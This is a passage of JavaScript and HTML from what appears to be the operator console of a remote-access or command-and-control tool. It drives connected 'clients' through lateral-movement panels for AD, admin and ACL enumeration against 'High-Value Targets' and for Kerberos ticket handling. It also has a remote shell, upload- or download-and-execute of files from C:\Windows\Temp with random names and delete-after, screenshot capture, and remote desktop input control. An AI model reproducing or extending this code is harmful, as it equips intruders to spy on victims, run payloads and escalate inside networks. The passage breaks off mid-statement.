            <input type="text" class="popup-input" id="ad-search" placeholder="Search filter..." style="flex:1;margin:0;padding:6px 10px;font-size:11px;">
            <button class="fm-btn" id="ad-enum-btn" style="padding:6px 12px;">Enumerate</button>
          </div>
          <div id="ad-filter-options" style="display:flex;gap:8px;margin-bottom:8px;">
            <label style="display:flex;align-items:center;gap:4px;font-size:10px;color:#888;">
              <input type="radio" name="ad-filter" value="all" checked style="width:12px;height:12px;">
              <span>All</span>
            </label>
            <label style="display:flex;align-items:center;gap:4px;font-size:10px;color:#888;">
              <input type="radio" name="ad-filter" value="admins" style="width:12px;height:12px;">
              <span>Admins</span>
            </label>
            <label style="display:flex;align-items:center;gap:4px;font-size:10px;color:#888;">
              <input type="radio" name="ad-filter" value="enabled" style="width:12px;height:12px;">
              <span>Enabled</span>
            </label>
            <label style="display:flex;align-items:center;gap:4px;font-size:10px;color:#888;">
              <input type="radio" name="ad-filter" value="disabled" style="width:12px;height:12px;">
              <span>Disabled</span>
            </label>
          </div>
          <div id="ad-results" style="min-height:150px;max-height:250px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:8px;">
            <div style="color:#666;font-size:11px;text-align:center;padding:40px;">Select enumeration type and click Enumerate</div>
          </div>
          <div id="ad-status" style="font-size:11px;margin-top:8px;"></div>
        </div>

        <!-- Kerberos Panel -->
        <div class="lateral-panel" id="lateral-kerberos" style="display:none;">
          <div style="margin-bottom:12px;padding:10px;background:rgba(0,0,0,.2);border-radius:6px;">
            <div style="color:#888;font-size:11px;margin-bottom:8px;font-weight:bold;">Kerberos Ticket Management</div>
            <div style="display:flex;gap:8px;">
              <button class="fm-btn" id="kerb-list-btn" style="flex:1;padding:6px 12px;font-size:11px;">List Tickets</button>
              <button class="fm-btn" id="kerb-purge-btn" style="flex:1;padding:6px 12px;font-size:11px;background:rgba(239,68,68,.2);">Purge Tickets</button>
            </div>
          </div>
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
            <span style="color:#888;font-size:11px;">Current Session Tickets</span>
            <button class="fm-btn" id="kerb-refresh-btn" style="padding:4px 8px;font-size:10px;">Refresh</button>
          </div>
          <div id="kerb-ticket-list" style="min-height:120px;max-height:200px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:8px;">
            <div style="color:#666;font-size:11px;text-align:center;padding:30px;">Click "List Tickets" to view current session tickets</div>
          </div>
          <div id="kerb-status" style="font-size:11px;margin-top:8px;"></div>
        </div>

        <!-- Security Panel -->
        <div class="lateral-panel" id="lateral-security" style="display:none;">
          <div style="margin-bottom:12px;padding:10px;background:rgba(0,0,0,.2);border-radius:6px;">
            <div style="color:#888;font-size:11px;margin-bottom:8px;font-weight:bold;">Local Security Enumeration</div>
            <div style="display:flex;gap:8px;flex-wrap:wrap;">
              <button class="fm-btn" id="sec-local-groups-btn" style="flex:1;min-width:120px;padding:6px 12px;font-size:11px;">Local Groups</button>
              <button class="fm-btn" id="sec-remote-access-btn" style="flex:1;min-width:120px;padding:6px 12px;font-size:11px;">Remote Access</button>
            </div>
          </div>
          <div style="margin-bottom:12px;padding:10px;background:rgba(0,0,0,.2);border-radius:6px;">
            <div style="color:#888;font-size:11px;margin-bottom:8px;font-weight:bold;">AD ACL Enumeration</div>
            <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
              <select class="popup-input" id="sec-acl-type" style="flex:1;min-width:100px;padding:6px 10px;font-size:11px;margin:0;">
                <option value="">High-Value Targets</option>
                <option value="users">Admin Users</option>
                <option value="groups">Admin Groups</option>
                <option value="computers">Domain Controllers</option>
                <option value="ous">OUs</option>
                <option value="gpos">GPOs</option>
              </select>
              <button class="fm-btn" id="sec-enum-acls-btn" style="padding:6px 12px;font-size:11px;">Enum ACLs</button>
            </div>
            <div style="font-size:10px;color:#666;">Shows who can control AD objects (GenericAll, WriteDACL, etc.)</div>
          </div>
          <div id="sec-results" style="min-height:150px;max-height:250px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:8px;">
            <div style="color:#666;font-size:11px;text-align:center;padding:40px;">Select an enumeration type above</div>
          </div>
          <div id="sec-status" style="font-size:11px;margin-top:8px;"></div>
        </div>
      `;

    // Placeholder for unimplemented features
    default:
      return `
        <div style="text-align:center;padding:40px 20px;">
          <div style="font-size:48px;margin-bottom:16px;opacity:.5;">🚧</div>
          <p style="color:#888;">This feature is not yet implemented.</p>
          <p style="color:#666;font-size:11px;margin-top:8px;">Action: ${action}</p>
        </div>
      `;
  }
};

const bindPopupActions = (action, client) => {
  // Cancel button for confirmation dialogs
  document.getElementById('cancel-action')?.addEventListener('click', closePopup);

  switch(action) {
    case 'remote-shell':
      const shellInput = document.getElementById('shell-input');
      const shellOutput = document.getElementById('shell-output');
      const sendCmd = () => {
        const cmd = shellInput.value.trim();
        if (!cmd) return;
        shellOutput.innerHTML += `<div style="color:#64b4ff;">&gt; ${cmd}</div>`;
        shellInput.value = '';
        // TODO: Send command to client
        console.log(`Shell command to ${client.uid}: ${cmd}`);
        setTimeout(() => {
          shellOutput.innerHTML += `<div style="color:#888;">[Response would appear here]</div>`;
          shellOutput.scrollTop = shellOutput.scrollHeight;
        }, 100);
      };
      document.getElementById('shell-send')?.addEventListener('click', sendCmd);
      shellInput?.addEventListener('keydown', e => { if (e.key === 'Enter') sendCmd(); });
      break;

    case 'remote-execute':
      const exeFileInput = document.getElementById('exe-file');
      const exePathInput = document.getElementById('exe-path');
      const exeFileSection = document.getElementById('exe-file-section');
      const exeUrlSection = document.getElementById('exe-url-section');
      const exeSourceRadios = document.querySelectorAll('input[name="exe-source"]');

      // Toggle between file and URL sections based on radio selection
      exeSourceRadios.forEach(radio => {
        radio.addEventListener('change', () => {
          const isFile = radio.value === 'file' && radio.checked;
          exeFileSection.style.display = isFile ? 'block' : 'none';
          exeUrlSection.style.display = isFile ? 'none' : 'block';
        });
      });

      // Browse button opens hidden file picker
      document.getElementById('exe-browse')?.addEventListener('click', () => {
        exeFileInput.click();
      });

      // When file is selected, update the text input
      exeFileInput?.addEventListener('change', () => {
        if (exeFileInput.files && exeFileInput.files[0]) {
          exePathInput.value = exeFileInput.files[0].name;
        }
      });

      document.getElementById('execute-btn')?.addEventListener('click', async () => {
        const args = document.getElementById('exe-args').value.trim();
        const deleteAfter = document.getElementById('exe-delete-after').checked;
        const execMode = document.querySelector('input[name="exe-mode"]:checked')?.value || 'child';
        const independent = execMode === 'independent';
        const sourceType = document.querySelector('input[name="exe-source"]:checked')?.value || 'file';

        if (sourceType === 'file') {
          // Local file upload and execute
          if (!exeFileInput.files || !exeFileInput.files[0]) {
            alert('Please select a file to upload and execute');
            return;
          }

          const file = exeFileInput.files[0];
          const fileName = file.name;
          const ext = fileName.includes('.') ? fileName.substring(fileName.lastIndexOf('.')) : '.exe';

          // Generate random filename for temp folder
          const randomName = Math.random().toString(36).substring(2, 10) + ext;
          const tempPath = `C:\\Windows\\Temp\\${randomName}`;

          try {
            // Read file as byte array
            const arrayBuffer = await file.arrayBuffer();
            const bytes = Array.from(new Uint8Array(arrayBuffer));

            // Upload file to client's temp folder
            await invoke('send_command', {
              uid: client.uid,
              command: {
                type: 'FileUpload',
                params: {
                  path: tempPath,
                  data: bytes
                }
              }
            });

            // Execute the uploaded file
            await invoke('send_command', {
              uid: client.uid,
              command: {
                type: 'FileExecute',
                params: {
                  path: tempPath,
                  args: args || null,
                  hidden: false,
                  delete_after: deleteAfter,
                  independent: independent
                }
              }
            });

            closePopup();
          } catch (e) {
            console.error('Upload & execute failed:', e);
            alert('Failed: ' + e);
          }
        } else {
          // URL download and execute
          const url = document.getElementById('exe-url').value.trim();
          if (!url) {
            alert('Please enter a URL to download and execute');
            return;
          }

          try {
            // Extract filename from URL or use random name
            let fileName = url.split('/').pop() || 'download.exe';
            if (fileName.includes('?')) fileName = fileName.split('?')[0];
            const ext = fileName.includes('.') ? fileName.substring(fileName.lastIndexOf('.')) : '.exe';
            const randomName = Math.random().toString(36).substring(2, 10) + ext;
            const tempPath = `C:\\Windows\\Temp\\${randomName}`;

            // Send download and execute command
            await invoke('send_command', {
              uid: client.uid,
              command: {
                type: 'DownloadExecute',
                params: {
                  url: url,
                  path: tempPath,
                  args: args || null,
                  hidden: false,
                  delete_after: deleteAfter,
                  independent: independent
                }
              }
            });

            closePopup();
          } catch (e) {
            console.error('Download & execute failed:', e);
            alert('Failed: ' + e);
          }
        }
      });
      break;

    case 'screenshot':
      let screenshotData = null;

      let screenshotUrl = null;

      // Listen for screenshot response
      const setupScreenshotListener = async () => {
        const { listen } = window.__TAURI__.event;
        return listen('shell-response', (event) => {
          if (event.payload.uid !== client.uid) return;
          const response = event.payload.response;
          if (response?.data?.type === 'Screenshot' && response.data.result?.data) {
            const container = document.getElementById('screenshot-view');
            const saveBtn = document.getElementById('save-screenshot');
            const expandBtn = document.getElementById('expand-screenshot');
            screenshotData = new Uint8Array(response.data.result.data);

            // Create blob and display image
            const blob = new Blob([screenshotData], { type: 'image/png' });
            if (screenshotUrl) URL.revokeObjectURL(screenshotUrl);
            screenshotUrl = URL.createObjectURL(blob);
            container.innerHTML = `<img src="${screenshotUrl}" style="max-width:100%;max-height:400px;border-radius:4px;">`;
            saveBtn.style.opacity = '1';
            saveBtn.style.pointerEvents = 'auto';
            expandBtn.style.opacity = '1';
            expandBtn.style.pointerEvents = 'auto';
          } else if (response?.data?.type === 'Error') {
            const container = document.getElementById('screenshot-view');
            container.innerHTML = `<span style="color:#f87171;">Error: ${response.data.result?.message || 'Unknown error'}</span>`;
          }
        });
      };

      let screenshotUnlisten = setupScreenshotListener();

      // Auto-capture on open
      const captureScreenshot = async () => {
        const container = document.getElementById('screenshot-view');
        const saveBtn = document.getElementById('save-screenshot');
        const expandBtn = document.getElementById('expand-screenshot');
        container.innerHTML = '<span style="color:#888;">Capturing...</span>';
        saveBtn.style.opacity = '0.4';
        saveBtn.style.pointerEvents = 'none';
        expandBtn.style.opacity = '0.4';
        expandBtn.style.pointerEvents = 'none';
        screenshotData = null;

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'Screenshot' }
          });
        } catch (e) {
          container.innerHTML = `<span style="color:#f87171;">Failed: ${e}</span>`;
        }
      };

      // Capture immediately
      captureScreenshot();

      // Refresh button
      document.getElementById('take-screenshot')?.addEventListener('click', captureScreenshot);

      // Expand button - opens image in fullscreen overlay
      document.getElementById('expand-screenshot')?.addEventListener('click', () => {
        if (!screenshotUrl) return;

        // Create fullscreen overlay
        const overlay = document.createElement('div');
        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);z-index:10000;display:flex;align-items:center;justify-content:center;cursor:zoom-out;';
        overlay.innerHTML = `<img src="${screenshotUrl}" style="max-width:95%;max-height:95%;object-fit:contain;border-radius:4px;">`;
        overlay.addEventListener('click', () => overlay.remove());
        document.body.appendChild(overlay);
      });

      // Save button
      document.getElementById('save-screenshot')?.addEventListener('click', async () => {
        if (!screenshotData) return;

        try {
          const { save } = window.__TAURI__.dialog;
          const { writeBinaryFile } = window.__TAURI__.fs;

          const filePath = await save({
            defaultPath: `screenshot_${Date.now()}.png`,
            filters: [{ name: 'PNG Image', extensions: ['png'] }]
          });

          if (filePath) {
            await writeBinaryFile(filePath, screenshotData);
            console.log('Screenshot saved to:', filePath);
          }
        } catch (e) {
          console.error('Failed to save screenshot:', e);
          alert('Failed to save screenshot: ' + e);
        }
      });

      // Cleanup on popup overlay click
      popupOverlay.addEventListener('click', async (e) => {
        if (e.target === popupOverlay) {
          const fn = await screenshotUnlisten;
          fn();
        }
      }, { once: true });
      break;

    case 'remote-desktop':
      // Use global state to track streaming per client (survives popup close/reopen)
      if (!window.rdStreamState) window.rdStreamState = {};
      const clientRdState = window.rdStreamState[client.uid] || { streaming: false, mode: null };
      window.rdStreamState[client.uid] = clientRdState;

      let rdStreaming = clientRdState.streaming;
      let rdUnlisten = null;
      let rdScreenWidth = 0;
      let rdScreenHeight = 0;
      let rdMode = clientRdState.mode || 'h264'; // 'h264' or 'jpeg'
      let rdH264Decoder = null;
      let rdIsHardwareEncoder = false;
      let rdStartTimeout = null;
      let rdListenersReady = false;

      const rdCanvas = document.getElementById('rd-canvas');
      const rdCtx = rdCanvas.getContext('2d');
      const rdContainer = document.getElementById('rd-canvas-container');
      const rdPlaceholder = document.getElementById('rd-placeholder');
      const rdStatus = document.getElementById('rd-status');

      // Helper to update streaming state (local + global + UI)
      const setRdStreaming = (streaming, mode = null) => {
        rdStreaming = streaming;
        clientRdState.streaming = streaming;
        if (mode) {
          rdMode = mode;
          clientRdState.mode = mode;
        }
        // Clear any pending timeout
        if (rdStartTimeout) {
          clearTimeout(rdStartTimeout);
          rdStartTimeout = null;
        }
        // Update UI
        if (streaming) {
          rdStartBtn.style.opacity = '0.4';
          rdStartBtn.style.pointerEvents = 'none';
          rdStopBtn.style.opacity = '1';
          rdStopBtn.style.pointerEvents = 'auto';
        } else {
          rdStartBtn.style.opacity = '1';
          rdStartBtn.style.pointerEvents = 'auto';
          rdStopBtn.style.opacity = '0.4';
          rdStopBtn.style.pointerEvents = 'none';
        }
      };

      // Helper to reset to stopped state (used on errors, timeouts, stop)
      const resetRdState = (statusMsg = 'Stopped') => {
        setRdStreaming(false);
        rdStatus.textContent = statusMsg;
        rdCanvas.style.display = 'none';
        rdPlaceholder.style.display = 'block';
        rdPlaceholder.textContent = 'Click Start to begin';
        if (rdH264Decoder) {
          try { rdH264Decoder.close(); } catch (e) { /* ignore */ }
          rdH264Decoder = null;
        }
      };
      const rdStartBtn = document.getElementById('rd-start');
      const rdStopBtn = document.getElementById('rd-stop');
      const rdFullscreenBtn = document.getElementById('rd-fullscreen');
      const rdQualitySelect = document.getElementById('rd-quality');
      const rdQualityOptions = document.getElementById('rd-quality-options');
      const rdQualityWrapper = document.getElementById('rd-quality-wrapper');
      const rdModeSelect = document.getElementById('rd-mode');
      const rdModeOptions = document.getElementById('rd-mode-options');
      const rdModeWrapper = document.getElementById('rd-mode-wrapper');

      // Update quality dropdown based on mode
      const updateQualityOptions = (mode) => {
        if (mode === 'h264') {
          rdQualityOptions.innerHTML = `
            <div class="custom-option" data-value="8">8 Mbps</div>
            <div class="custom-option" data-value="6">6 Mbps</div>
            <div class="custom-option selected" data-value="4">4 Mbps</div>
            <div class="custom-option" data-value="2">2 Mbps</div>
            <div class="custom-option" data-value="1">1 Mbps</div>
          `;
          rdQualitySelect.textContent = '4 Mbps';
          rdQualitySelect.dataset.value = '4';
        } else {
          rdQualityOptions.innerHTML = `
            <div class="custom-option" data-value="90">90%</div>
            <div class="custom-option" data-value="80">80%</div>
            <div class="custom-option selected" data-value="70">70%</div>
            <div class="custom-option" data-value="60">60%</div>
            <div class="custom-option" data-value="50">50%</div>
          `;
          rdQualitySelect.textContent = 'Quality: 70%';
          rdQualitySelect.dataset.value = '70';
        }
      };

      // Initialize dropdown behavior
      const initRdDropdown = (wrapper, selectBtn, optionsContainer, formatFn) => {
        selectBtn.addEventListener('click', (e) => {
          e.stopPropagation();
          document.querySelectorAll('.select-wrapper').forEach(w => {
            if (w !== wrapper) w.classList.remove('open');
          });
          wrapper.classList.toggle('open');
        });
        optionsContainer.addEventListener('click', (e) => {
          const option = e.target.closest('.custom-option');
          if (!option) return;
          e.stopPropagation();
          const value = option.dataset.value;
          optionsContainer.querySelectorAll('.custom-option').forEach(opt => opt.classList.remove('selected'));
          option.classList.add('selected');
          selectBtn.textContent = formatFn ? formatFn(value, option.textContent) : option.textContent;
          selectBtn.dataset.value = value;
          wrapper.classList.remove('open');
        });
      };

      initRdDropdown(rdModeWrapper, rdModeSelect, rdModeOptions, (val, text) => text);
      initRdDropdown(rdQualityWrapper, rdQualitySelect, rdQualityOptions, (val, text) => text);

      // Mode change handler
      rdModeOptions.addEventListener('click', (e) => {
        const option = e.target.closest('.custom-option');
        if (option) {
          rdMode = option.dataset.value;
          updateQualityOptions(rdMode);
        }
      });

      // Close dropdowns when clicking outside
      document.addEventListener('click', (e) => {
        if (!e.target.closest('.select-wrapper')) {
          rdQualityWrapper.classList.remove('open');
          rdModeWrapper.classList.remove('open');
        }
      });

      // Initialize H.264 decoder using WebCodecs
      const initH264Decoder = async (width, height) => {
        if (rdH264Decoder) {
          rdH264Decoder.close();
          rdH264Decoder = null;
        }

        // Check WebCodecs support
        if (typeof VideoDecoder === 'undefined') {
          console.error('WebCodecs not supported');
          rdStatus.textContent = 'Error: WebCodecs not supported in this browser';
          return false;
        }

        try {
          rdH264Decoder = new VideoDecoder({
            output: (frame) => {
              // Update canvas size if needed
              if (rdCanvas.width !== frame.displayWidth || rdCanvas.height !== frame.displayHeight) {
                rdCanvas.width = frame.displayWidth;
                rdCanvas.height = frame.displayHeight;
              }
              // Draw frame to canvas
              rdCtx.drawImage(frame, 0, 0);
              frame.close();
            },
            error: (e) => {
              console.error('H.264 decode error:', e);
              rdStatus.textContent = 'Decode error: ' + e.message;
            }
          });

          // Configure decoder - use Constrained Baseline for maximum compatibility
          await rdH264Decoder.configure({
            codec: 'avc1.42001f', // Baseline profile, level 3.1
            codedWidth: width,
            codedHeight: height,
            hardwareAcceleration: 'prefer-hardware',
            optimizeForLatency: true,
          });

          console.log('H.264 decoder initialized:', width, 'x', height);
          return true;
        } catch (e) {
          console.error('Failed to init H.264 decoder:', e);
          rdStatus.textContent = 'Error: ' + e.message;
          return false;
        }
      };

      // Setup H.264 frame listener
      const setupRdH264FrameListener = async () => {
        const { listen } = window.__TAURI__.event;
        let frameCount = 0;
        let lastFpsTime = Date.now();
        let fpsCounter = 0;

        return listen('remote-desktop-h264-frame', async (event) => {
          if (event.payload.uid !== client.uid) return;

          // Ignore frames if we're not streaming (e.g., during shutdown)
          if (!rdStreaming && frameCount > 0) return;

          const { width, height, isKeyframe, timestampMs, data } = event.payload;

          // Show canvas, hide placeholder
          rdCanvas.style.display = 'block';
          rdPlaceholder.style.display = 'none';

          // Mark as streaming (first frame received confirms stream is active)
          if (!rdStreaming) {
            setRdStreaming(true, 'h264');
          }

          // Initialize decoder on first keyframe or if dimensions changed
          if (!rdH264Decoder || rdH264Decoder.state === 'closed' ||
              (isKeyframe && (rdCanvas.width !== width || rdCanvas.height !== height))) {
            const ok = await initH264Decoder(width, height);
            if (!ok) {
              rdStatus.textContent = 'Decoder init failed!';
              return;
            }
          }

          // Skip non-keyframes until we have a decoder ready
          if (!rdH264Decoder || rdH264Decoder.state !== 'configured') {
            if (!isKeyframe) return;
          }

          try {
            // Create encoded video chunk from NAL data
            const chunk = new EncodedVideoChunk({
              type: isKeyframe ? 'key' : 'delta',
              timestamp: timestampMs * 1000, // WebCodecs uses microseconds
              data: new Uint8Array(data),
            });

            rdH264Decoder.decode(chunk);
            frameCount++;
            fpsCounter++;

            // Update FPS display every second
            const now = Date.now();
            if (now - lastFpsTime >= 1000) {
              const fps = fpsCounter;
              fpsCounter = 0;
              lastFpsTime = now;
              const hwLabel = rdIsHardwareEncoder ? ' HW' : ' SW';
              rdStatus.textContent = `H.264${hwLabel} ${width}x${height} @ ${fps} fps`;
            }
          } catch (e) {
            // Ignore errors during shutdown
            if (rdStreaming) {
              rdStatus.textContent = 'Decode error: ' + e.message;
            }
          }
        });
      };

      // Setup tile-based frame listener (JPEG mode)
      const setupRdFrameListener = async () => {
        const { listen } = window.__TAURI__.event;
        let frameCount = 0;

        return listen('remote-desktop-tile-frame', (event) => {
          if (event.payload.uid !== client.uid) return;

          const width = event.payload.width;
          const height = event.payload.height;
          const tiles = event.payload.tiles;

          // Update canvas dimensions if needed (only on size change)
          if (rdCanvas.width !== width || rdCanvas.height !== height) {
            // Save current content before resize
            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = rdCanvas.width;
            tempCanvas.height = rdCanvas.height;
            tempCanvas.getContext('2d').drawImage(rdCanvas, 0, 0);

            rdCanvas.width = width;
            rdCanvas.height = height;

            // Restore content if there was any
            if (tempCanvas.width > 0 && tempCanvas.height > 0) {
              rdCtx.drawImage(tempCanvas, 0, 0);
            }
          }

          // Show canvas, hide placeholder
          rdCanvas.style.display = 'block';
          rdPlaceholder.style.display = 'none';

          // Mark as streaming (first frame received confirms stream is active)
          if (!rdStreaming) {
            setRdStreaming(true, 'jpeg');
          }

          // Draw each tile at its position (no clearing - tiles overlay existing content)
          if (tiles && tiles.length > 0) {
            frameCount++;

            for (const tile of tiles) {
              const bytes = new Uint8Array(tile.jpegData);
              const blob = new Blob([bytes], { type: 'image/jpeg' });
              const url = URL.createObjectURL(blob);
              const img = new Image();
              img.onload = () => {
                rdCtx.drawImage(img, tile.x, tile.y, tile.width, tile.height);
                URL.revokeObjectURL(url);
              };
              img.onerror = () => {
                URL.revokeObjectURL(url);
              };
              img.src = url;
            }

            rdStatus.textContent = `JPEG ${width}x${height} (${tiles.length} tiles)`;
          }
        });
      };

      // Setup response listener
      const setupRdResponseListener = async () => {
        const { listen } = window.__TAURI__.event;
        return listen('shell-response', (event) => {
          if (event.payload.uid !== client.uid) return;
          const response = event.payload.response;

          if (response?.data?.type === 'RemoteDesktopStarted') {
            rdScreenWidth = response.data.result.width;
            rdScreenHeight = response.data.result.height;
            setRdStreaming(true, 'jpeg');
            rdStatus.textContent = `Connected JPEG (${rdScreenWidth}x${rdScreenHeight})`;
          } else if (response?.data?.type === 'RemoteDesktopH264Started') {
            rdScreenWidth = response.data.result.width;
            rdScreenHeight = response.data.result.height;
            rdIsHardwareEncoder = response.data.result.is_hardware;
            setRdStreaming(true, 'h264');
            const hwLabel = rdIsHardwareEncoder ? 'HW' : 'SW';
            rdStatus.textContent = `Connected H.264 ${hwLabel} (${rdScreenWidth}x${rdScreenHeight})`;
          } else if (response?.data?.type === 'RemoteDesktopStopped' || response?.data?.type === 'RemoteDesktopH264Stopped') {
            resetRdState('Stopped');
          } else if (response?.data?.type === 'Error') {
            // Check if this is a "stream already running" error - sync state
            const errMsg = response.data.result?.message || 'Unknown';
            if (errMsg.toLowerCase().includes('already running') || errMsg.toLowerCase().includes('already streaming')) {
              // Stream is running on client but we didn't know - sync state
              setRdStreaming(true);
              rdStatus.textContent = 'Stream active (recovered)';
              rdPlaceholder.textContent = 'Receiving...';
            } else {
              // Other error - reset to stopped state
              resetRdState('Error: ' + errMsg);
            }
          }
        });
      };

      // Initialize listeners (both modes) - must complete before any interaction
      rdUnlisten = Promise.all([setupRdFrameListener(), setupRdH264FrameListener(), setupRdResponseListener()]);
      rdUnlisten.then(() => { rdListenersReady = true; });

      // Start button
      rdStartBtn.addEventListener('click', async () => {
        // Ensure listeners are ready
        if (!rdListenersReady) {
          await rdUnlisten;
          rdListenersReady = true;
        }

        // Don't start if already streaming
        if (rdStreaming) {
          rdStatus.textContent = 'Stream already active';
          return;
        }

        rdMode = rdModeSelect.dataset.value || 'h264';
        const quality = parseInt(rdQualitySelect.dataset.value) || (rdMode === 'h264' ? 4 : 70);
        const fps = 30;

        rdStatus.textContent = 'Starting...';
        rdPlaceholder.textContent = 'Connecting...';

        // Disable start button immediately to prevent double-click
        rdStartBtn.style.opacity = '0.4';
        rdStartBtn.style.pointerEvents = 'none';

        // Set a timeout - if we don't get frames within 10s, reset
        rdStartTimeout = setTimeout(() => {
          if (!rdStreaming) {
            resetRdState('Connection timeout');
          }
        }, 10000);

        try {
          if (rdMode === 'h264') {
            // H.264 mode
            await invoke('send_command', {
              uid: client.uid,
              command: {
                type: 'RemoteDesktopH264Start',
                params: { fps, bitrate_mbps: quality, keyframe_interval_secs: 2 }
              }
            });
          } else {
            // JPEG tile mode
            await invoke('send_command', {
              uid: client.uid,
              command: {
                type: 'RemoteDesktopStart',
                params: { fps: 15, quality, resolution: null }
              }
            });
          }
        } catch (e) {
          resetRdState('Failed: ' + e);
        }
      });

      // Stop button
      rdStopBtn.addEventListener('click', async () => {
        rdStatus.textContent = 'Stopping...';
        // Disable stop button to prevent double-click
        rdStopBtn.style.opacity = '0.4';
        rdStopBtn.style.pointerEvents = 'none';

        try {
          // Stop whichever mode is active (try both to be safe)
          const stopCmd = rdMode === 'h264' ? 'RemoteDesktopH264Stop' : 'RemoteDesktopStop';
          await invoke('send_command', {
            uid: client.uid,
            command: { type: stopCmd }
          });
          // If we don't get a response within 3s, force reset
          setTimeout(() => {
            if (rdStreaming) {
              resetRdState('Stopped (forced)');
            }
          }, 3000);
        } catch (e) {
          // On error, still reset state - better to be in a usable state
          resetRdState('Stopped');
        }
      });

      // Fullscreen button
      rdFullscreenBtn.addEventListener('click', () => {
        if (!rdStreaming) return;

        const overlay = document.createElement('div');
        overlay.id = 'rd-fullscreen-overlay';
        overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.98);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;';

        const fullCanvas = document.createElement('canvas');
        fullCanvas.style.cssText = 'max-width:98vw;max-height:92vh;cursor:crosshair;';
        fullCanvas.width = rdCanvas.width;
        fullCanvas.height = rdCanvas.height;
        const fullCtx = fullCanvas.getContext('2d');
        fullCtx.drawImage(rdCanvas, 0, 0);
        overlay.appendChild(fullCanvas);

        const closeHint = document.createElement('div');
        closeHint.style.cssText = 'position:absolute;bottom:20px;color:#666;font-size:12px;';
        closeHint.textContent = 'Press ESC to close';
        overlay.appendChild(closeHint);

        // Update fullscreen canvas with frames
        const updateInterval = setInterval(() => {
          if (rdCanvas.width !== fullCanvas.width || rdCanvas.height !== fullCanvas.height) {
            fullCanvas.width = rdCanvas.width;
            fullCanvas.height = rdCanvas.height;
          }
          fullCtx.drawImage(rdCanvas, 0, 0);
        }, 50);

        // Forward mouse events to client
        const sendMouseEvent = (e, action) => {
          const rect = fullCanvas.getBoundingClientRect();
          // Calculate position as percentage of canvas, then map to 0-65535
          const relX = (e.clientX - rect.left) / rect.width;
          const relY = (e.clientY - rect.top) / rect.height;
          // Clamp to valid range and convert to 0-65535
          const x = Math.round(Math.max(0, Math.min(1, relX)) * 65535);
          const y = Math.round(Math.max(0, Math.min(1, relY)) * 65535);

          invoke('send_command', {
            uid: client.uid,
            command: {
              type: 'RemoteDesktopMouseInput',
              params: { x, y, action, scroll_delta: null }
            }
          });
        };

        // Only send mouse position on clicks, not on move (bandwidth optimization)
        fullCanvas.addEventListener('mousedown', (e) => {
          const actions = { 0: 'left_down', 2: 'right_down', 1: 'middle_down' };
          sendMouseEvent(e, actions[e.button] || 'left_down');
        });
        fullCanvas.addEventListener('mouseup', (e) => {
          const actions = { 0: 'left_up', 2: 'right_up', 1: 'middle_up' };
          sendMouseEvent(e, actions[e.button] || 'left_up');
        });
        fullCanvas.addEventListener('wheel', (e) => {
          e.preventDefault();
          const delta = e.deltaY > 0 ? -120 : 120;
          invoke('send_command', {
            uid: client.uid,
            command: {
              type: 'RemoteDesktopMouseInput',
              params: { x: 0, y: 0, action: 'scroll', scroll_delta: delta }
            }
          });
        });
        fullCanvas.addEventListener('contextmenu', (e) => e.preventDefault());

        // Forward keyboard events
        const sendKeyEvent = (e, action) => {
          e.preventDefault();
          invoke('send_command', {
            uid: client.uid,
            command: {
              type: 'RemoteDesktopKeyInput',
              params: { vk_code: e.keyCode, action }
            }
          });
        };

        const keydownHandler = (e) => {
          if (e.key === 'Escape') {
            clearInterval(updateInterval);
            document.removeEventListener('keydown', keydownHandler);
            document.removeEventListener('keyup', keyupHandler);
            overlay.remove();
            return;
          }
          sendKeyEvent(e, 'down');
        };
        const keyupHandler = (e) => sendKeyEvent(e, 'up');

        document.addEventListener('keydown', keydownHandler);
        document.addEventListener('keyup', keyupHandler);

        document.body.appendChild(overlay);
        fullCanvas.focus();
      });

      // Mouse events on main canvas
      const sendMainMouseEvent = (e, action) => {
        if (!rdStreaming) return;
        const rect = rdCanvas.getBoundingClientRect();
        // Calculate position as percentage of canvas, then map to 0-65535
        const relX = (e.clientX - rect.left) / rect.width;
        const relY = (e.clientY - rect.top) / rect.height;
        // Clamp to valid range and convert to 0-65535
        const x = Math.round(Math.max(0, Math.min(1, relX)) * 65535);
        const y = Math.round(Math.max(0, Math.min(1, relY)) * 65535);

        invoke('send_command', {
          uid: client.uid,
          command: {
            type: 'RemoteDesktopMouseInput',
            params: { x, y, action, scroll_delta: null }
          }
        });
      };

      // Only send mouse position on clicks, not on move (bandwidth optimization)
      rdCanvas.addEventListener('mousedown', (e) => {
        const actions = { 0: 'left_down', 2: 'right_down', 1: 'middle_down' };
        sendMainMouseEvent(e, actions[e.button] || 'left_down');
      });
      rdCanvas.addEventListener('mouseup', (e) => {
        const actions = { 0: 'left_up', 2: 'right_up', 1: 'middle_up' };
        sendMainMouseEvent(e, actions[e.button] || 'left_up');
      });
      rdCanvas.addEventListener('wheel', (e) => {
        if (!rdStreaming) return;
        e.preventDefault();
        const delta = e.deltaY > 0 ? -120 : 120;
        invoke('send_command', {
          uid: client.uid,
          command: {
            type: 'RemoteDesktopMouseInput',
            params: { x: 0, y: 0, action: 'scroll', scroll_delta: delta }
          }
        });
      });
      rdCanvas.addEventListener('contextmenu', (e) => e.preventDefault());

      // Special key buttons
      document.querySelectorAll('.rd-special-btn').forEach(btn => {
        btn.addEventListener('click', async () => {
          if (!rdStreaming) return;
          const key = btn.dataset.key;
          try {
            await invoke('send_command', {
              uid: client.uid,
              command: {
                type: 'RemoteDesktopSpecialKey',
                params: { key }
              }
            });
          } catch (e) {
            console.error('Special key error:', e);
          }
        });
      });

      // Cleanup on popup close - ALWAYS stop stream when closing window
      popupCleanupCallback = async () => {
        // Clear any pending timeout
        if (rdStartTimeout) {
          clearTimeout(rdStartTimeout);
          rdStartTimeout = null;
        }

        // Stop stream if active
        if (rdStreaming || clientRdState.streaming) {
          try {
            // Stop whichever mode might be active (try both to be safe)
            await invoke('send_command', {
